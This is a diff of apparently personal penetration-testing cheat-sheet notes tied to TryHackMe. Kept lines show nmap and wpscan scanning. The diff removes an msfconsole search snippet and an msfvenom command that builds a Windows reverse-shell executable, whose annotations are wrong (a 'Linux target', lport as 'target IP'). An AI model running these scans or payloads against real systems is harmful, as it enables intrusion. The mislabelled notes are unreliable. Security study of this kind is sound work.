@@ -437,13 +437,6 @@ nmap [host / ip]
 
 `nmap $ip -p- -A -v -top-ports 100`
 
-
-### msfconsole
-
-```
-search smtp enum
-```
-
 ### WordPress blogs~
 ```
 wpscan
@@ -1066,20 +1059,6 @@ Gosh IDK man
 As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z
 
 >https://tryhackme.com/room/introtoshells
-
----
-
-# msfvenom create payloads
-
-```
-msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
-```
-
-- -p    creates payload
-- windows/x64/shell/reverse_tcp     reverse shell for a x86 Linux Target
-- -f    prints to .exe format
-- lhost     listen IP
-- lport     target IP
 
 ---
 
